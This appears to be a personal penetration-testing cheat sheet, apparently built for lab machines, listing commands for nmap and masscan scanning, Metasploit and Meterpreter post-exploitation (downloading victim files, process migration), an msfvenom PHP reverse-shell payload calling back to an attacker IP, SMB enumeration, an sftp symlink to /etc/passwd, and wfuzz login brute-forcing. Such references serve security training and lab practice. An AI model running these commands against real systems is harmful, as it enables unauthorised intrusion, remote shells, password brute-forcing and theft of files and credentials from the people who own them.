ASCII,Hex,Binary,Decimal,Base64 converter:
  https://gchq.github.io/CyberChef/
  https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html
ftp:
  lftp:
  	$ lftp Anonymous@<target>
  ftp:
  	$ apt install ftp
	$ ftp <target>
		ftp> get "file"
  wget:
	  $ wget -r ftp://<target>
Masscan:
  $ masscan -p1-65535 <target> --rate=1000 -e <interface> > file
  $ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//' )
  $ nmap -Pn -sV -sC -p $ports <target>
Metasploit:
  pre-start:
    $ msfdb init
    $ systemctl enable postgresql
  db_nmap:
    # Use workspaces to separate different scans
    msf> workspace --add <name>
    msf> db_nmap -Pn -pn -n -v <target>/<cidr>
    msf> db_nmap -sV -sC -Pn -n -v -p <port-list> <target>
    # identified services and hosts are saved in the workspace
    msf> services
    msf> hosts
Meterpreter:
	post exploit “Multi Recon Local Exploit Suggester”: 
		msf> use post/multi/recon/local_exploit/suggester
		msf> set session <id>
		msf> run
	Download files from victim:
		msf> download /path/to/file /local/path
	Migrate:
		1.
		meterpreter> ps -S <process name>
		meterpreter> ps
		meterpreter> migrate <pid>
		meterpreter> migrate <pid> -t <seconds>
		2.
		use post/windows/manage/migrate
		msf post(windows/manage/migrate)>set session 1
		msf post(windows/manage/migrate)> run
	Interactive shell (if shell command doesnt work):
		meterpreter> execute -i -f /bin/bash
Msfvenom:
	msfvenom -p php/meterpreter/reverse_tcp lhost=<kali-ip> lport=<port> -f <format> > file
	msfvenom --list archs
	msfvenom --list formats
Nmap:
  basic scans:
    $ nmap -Pn -n -v <target>/<cidr>
    $ nmap -sS -Pn -n -p- <target>
    $ nmap -sV -sC -Pn -n -v -p port1,port2,..portN <target>
  http:
    $ nmap -sV -p 80 --script http-methods,http-enum <target>
  nmap automator:
    https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh
Nikto:
	nikto -h <address>
	nikto -h <address> -p <port>
	nikto -h https://<address>:<port>/
	nikto -h <address> -p <port> -ssl
Password Cracking:
  https://hashkiller.co.uk/
  https://crackstation.net/
Searchsploit:
  $ searchsploit -m <exploit-pattern>
SFTP:
	$ sftp user@<target>
		sftp> get/put <file>
	  sftp> symlink /etc/passwd/ passwd
SMB:
  discovery:
  	use auxiliary/scanner/smb/smb2
	use auxiliary/scanner/smb/smb1
	use auxiliary/scanner/smb/smb_version  
  get share list:
  	$ smbclient -L <target>
  	$ smbclient -L <target> -U <user>
  	$ enum4linux -S <target>
  Connect:
	  $ smbclient //<target>/<share>
	  $ smbclient \\\\<target>\\<share>
    $ smbclient //<target>/<share> -U <user>
	  smb> get <file> -	(read a file)
	  smb> get "<file>"	(download)
  Eternalblue scan:
	nmap --script vuln -p445 <target>
  impacket smbclient:
	./smbclient.py user:password@<target>
Webshells:
	/usr/share/webshells
wfuzz POST & GET:
	FUZZ keyword, -hw (wide answers based on word length)
		wfuzz -w wordlist.txt -L 20 -d "username=alex&password=FUZZ" http://<target>/login.php
		wfuzz -w wordlist.txt -L  http//<target>/login.php?username=<user>\&password=FUZZ
	-hh: hide responses with content-length number
		wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.69/sync?FUZZ=ls -c --hh 19
	wfuzz -u http://10.10.10.109/path/FUZZ -w /usr/share/dirb/wordlists/common.txt
Wordlists:
	/usr/share/wordlists
	https://github.com/danielmiessler/SecLists.git
Wordlist generation:
	cewl <target> > wordlist.txt
	crunch (generate based on charset, min, max number of chars)
		crunch <min-chars> <max-chars> <charset> -o output.txt
		crunch 15 15 -t Th4C00lTheacha^ -o pass.txt
			-t (literal)
				@: lower
				,: upper
				%: numbers
				^: symbols
